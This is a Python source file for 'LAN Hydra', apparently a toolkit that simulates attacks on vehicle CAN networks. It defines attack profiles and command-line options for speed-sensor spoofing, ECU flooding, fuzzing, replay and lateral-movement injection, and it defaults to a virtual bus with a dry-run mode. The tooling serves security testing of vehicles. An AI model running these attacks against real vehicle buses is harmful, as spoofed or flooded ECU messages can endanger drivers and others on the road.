# lanhydra.py
import argparse
import sys
import os
import json
from typing import Dict, Any

# Ensure repo root is on sys.path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

# Import plugins/scripts
from ecus import speed_ecu
from monitor import monitor_bus
from attacks import injection
from attacks.plugins.injection_plugin import InjectionPlugin
from attacks.plugins.flooding_plugin import FloodingPlugin
from attacks.plugins.fuzzing_plugin import FuzzingPlugin

class AttackManager:
    """Manages multiple attack scenarios and profiles"""
    
    def __init__(self):
        self.active_attacks = {}
        self.profiles = self._load_attack_profiles()
    
    def _load_attack_profiles(self) -> Dict[str, Dict[str, Any]]:
        """Load predefined attack profiles"""
        profiles = {
            "speed_spoof": {
                "description": "Spoof speed sensor readings",
                "attack_type": "injection",
                "config": {
                    "id": 0x100,
                    "value": 255,
                    "interval": 0.1,
                    "duration": 30
                }
            },
            "ecu_flood": {
                "description": "Flood ECU with high-rate messages",
                "attack_type": "flooding",
                "config": {
                    "id": 0x200,
                    "rate": 100.0,
                    "duration": 15
                }
            },
            "lateral_movement": {
                "description": "Progressive lateral movement across ECUs",
                "attack_type": "injection",
                "config": {
                    "ids": [0x100, 0x200, 0x300],
                    "pattern": "escalate",
                    "duration": 45
                }
            },
            "replay_attack": {
                "description": "Replay captured CAN messages",
                "attack_type": "replay",
                "config": {
                    "log_file": "data/monitor.log",
                    "speed": 2.0,
                    "duration": 20
                }
            }
        }
        return profiles
    
    def run_profile(self, profile_name: str, bustype: str = "virtual", 
                   channel: str = None, dry_run: bool = False):
        """Run a predefined attack profile"""
        if profile_name not in self.profiles:
            print(f"Unknown profile: {profile_name}")
            print(f"Available profiles: {list(self.profiles.keys())}")
            return
            
        profile = self.profiles[profile_name]
        print(f"Running attack profile: {profile_name}")
        print(f"Description: {profile['description']}")
        
        config = profile["config"].copy()
        config.update({"bustype": bustype, "channel": channel})
        
        if profile["attack_type"] == "injection":
            if "ids" in config:
                # Lateral movement attack
                injector = injection.AdvancedInjector(bustype=bustype, channel=channel)
                injector.lateral_movement_attack(
                    config["ids"], 
                    config.get("pattern", "escalate"),
                    config["duration"],
                    dry_run
                )
            else:
                # Basic injection
                injector = injection.AdvancedInjector(bustype=bustype, channel=channel)
                injector.basic_injection(
                    config["id"], 
                    config["value"],
                    config["duration"],
                    config.get("interval", 0.1),
                    dry_run
                )
        elif profile["attack_type"] == "flooding":
            plugin = FloodingPlugin(config, dry_run)
            plugin.start()
            try:
                plugin._thread.join(timeout=config["duration"])
            except KeyboardInterrupt:
                pass
            finally:
                plugin.stop()
        elif profile["attack_type"] == "replay":
            injector = injection.AdvancedInjector(bustype=bustype, channel=channel)
            injector.replay_attack(
                config["log_file"],
                config["duration"],
                config.get("speed", 1.0),
                dry_run
            )

def main():
    parser = argparse.ArgumentParser(
        description="LAN Hydra - Internal Threat Simulation Toolkit for Vehicle Networks",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run ECU simulation
  python lanhydra.py ecu --bustype virtual
  
  # Monitor CAN bus
  python lanhydra.py monitor --bustype virtual
  
  # Basic injection attack
  python lanhydra.py attack --type injection --id 0x100 --value 220 --duration 10
  
  # Run predefined attack profile
  python lanhydra.py profile --name speed_spoof --duration 30
  
  # Advanced injection with multiple attack types
  python lanhydra.py attack --type advanced --attack basic --id 0x200 --value 255 --duration 15
  
  # Safe testing with dry-run
  python lanhydra.py profile --name lateral_movement --dry-run
        """
    )
    
    subparsers = parser.add_subparsers(dest="command", required=True)
    
    # ECU subcommand
    ecu_parser = subparsers.add_parser("ecu", help="Run ECU simulation")
    ecu_parser.add_argument("--bustype", default="virtual", help="Bus type (default: virtual)")
    ecu_parser.add_argument("--channel", default=None, help="Channel (default: None)")
    ecu_parser.add_argument("--interval", type=float, default=1.0, help="Publish interval (seconds)")
    
    # Monitor subcommand
    mon_parser = subparsers.add_parser("monitor", help="Monitor CAN bus traffic")
    mon_parser.add_argument("--bustype", default="virtual", help="Bus type (default: virtual)")
    mon_parser.add_argument("--channel", default=None, help="Channel (default: None)")
    mon_parser.add_argument("--filter", help="Filter CAN IDs (comma-separated hex values)")
    mon_parser.add_argument("--output", default="data/monitor.log", help="Output log file")
    
    # Attack subcommand
    attack_parser = subparsers.add_parser("attack", help="Execute attack scenarios")
    attack_parser.add_argument("--type", choices=["injection", "flooding", "fuzzing", "advanced"], 
                              required=True, help="Attack type")
    attack_parser.add_argument("--bustype", default="virtual", help="Bus type (default: virtual)")
    attack_parser.add_argument("--channel", default=None, help="Channel (default: None)")
    attack_parser.add_argument("--dry-run", action="store_true", help="Simulate without sending")
    
    # Advanced attack arguments
    attack_parser.add_argument("--attack", choices=["basic", "spoof", "replay", "lateral"],
                              help="Advanced attack subtype")
    attack_parser.add_argument("--id", help="CAN ID (hex format)")
    attack_parser.add_argument("--value", type=int, help="Payload value")
    attack_parser.add_argument("--duration", type=int, required=True, help="Attack duration (seconds)")
    attack_parser.add_argument("--interval", type=float, default=0.1, help="Injection interval")
    
    # Spoofing arguments
    attack_parser.add_argument("--spoof-value", type=int, help="Malicious value")
    attack_parser.add_argument("--original-value", type=int, help="Original value")
    
    # Replay arguments
    attack_parser.add_argument("--log-file", help="Replay log file")
    attack_parser.add_argument("--speed", type=float, default=1.0, help="Replay speed")
    
    # Lateral movement arguments
    attack_parser.add_argument("--targets", help="Target CAN IDs (comma-separated)")
    attack_parser.add_argument("--pattern", choices=["escalate", "random", "sequential"],
                              default="escalate", help="Attack pattern")
    
    # Profile subcommand
    profile_parser = subparsers.add_parser("profile", help="Run predefined attack profiles")
    profile_parser.add_argument("--name", required=True, help="Profile name")
    profile_parser.add_argument("--bustype", default="virtual", help="Bus type")
    profile_parser.add_argument("--channel", default=None, help="Channel")
    profile_parser.add_argument("--duration", type=int, help="Override profile duration")
    profile_parser.add_argument("--dry-run", action="store_true", help="Simulate without sending")
    
    # List profiles subcommand
    subparsers.add_parser("list-profiles", help="List available attack profiles")
    
    args = parser.parse_args()
    
    # Execute commands
    if args.command == "ecu":
        speed_ecu.run(bustype=args.bustype, channel=args.channel, interval=args.interval)
        
    elif args.command == "monitor":
        # Enhanced monitoring could be added here
        monitor_bus.run(bustype=args.bustype, channel=args.channel)
        
    elif args.command == "attack":
        if args.type == "injection":
            # Legacy injection
            injection.run(duration=args.duration, value=args.value,
                         bustype=args.bustype, channel=args.channel)
                         
        elif args.type == "advanced":
            if not args.attack:
                parser.error("Advanced attack requires --attack parameter")
                
            injector = injection.AdvancedInjector(bustype=args.bustype, channel=args.channel)
            
            if args.attack == "basic":
                if not args.id or args.value is None:
                    parser.error("Basic attack requires --id and --value")
                injector.basic_injection(args.id, args.value, args.duration,
                                       args.interval, args.dry_run)
                                       
            elif args.attack == "spoof":
                if not args.id or args.spoof_value is None or args.original_value is None:
                    parser.error("Spoof attack requires --id, --spoof-value, and --original-value")
                injector.spoofing_attack(args.id, args.spoof_value, args.original_value,
                                       args.duration, args.interval, args.dry_run)
                                       
            elif args.attack == "replay":
                if not args.log_file:
                    parser.error("Replay attack requires --log-file")
                injector.replay_attack(args.log_file, args.duration, args.speed, args.dry_run)
                
            elif args.attack == "lateral":
                if not args.targets:
                    parser.error("Lateral movement requires --targets")
                target_ids = [int(id.strip(), 16) for id in args.targets.split(",")]
                injector.lateral_movement_attack(target_ids, args.pattern,
                                               args.duration, args.dry_run)
                                               
        elif args.type == "flooding":
            config = {
                "bustype": args.bustype,
                "channel": args.channel,
                "id": int(args.id, 16) if args.id else 0x100,
                "rate": 100.0,
                "duration": args.duration
            }
            plugin = FloodingPlugin(config, args.dry_run)
            plugin.start()
            try:
                plugin._thread.join(timeout=args.duration)
            except KeyboardInterrupt:
                pass
            finally:
                plugin.stop()
                
        elif args.type == "fuzzing":
            config = {
                "bustype": args.bustype,
                "channel": args.channel,
                "ids": [int(args.id, 16)] if args.id else [0x100],
                "interval": args.interval,
                "duration": args.duration
            }
            plugin = FuzzingPlugin(config, args.dry_run)
            plugin.start()
            try:
                plugin._thread.join(timeout=args.duration)
            except KeyboardInterrupt:
                pass
            finally:
                plugin.stop()
                
    elif args.command == "profile":
        manager = AttackManager()
        if args.duration:
            # Override profile duration
            manager.profiles[args.name]["config"]["duration"] = args.duration
        manager.run_profile(args.name, args.bustype, args.channel, args.dry_run)
        
    elif args.command == "list-profiles":
        manager = AttackManager()
        print("Available Attack Profiles:")
        print("=" * 50)
        for name, profile in manager.profiles.items():
            print(f"Name: {name}")
            print(f"Description: {profile['description']}")
            print(f"Type: {profile['attack_type']}")
            print(f"Config: {profile['config']}")
            print("-" * 30)

if __name__ == "__main__":
    main()
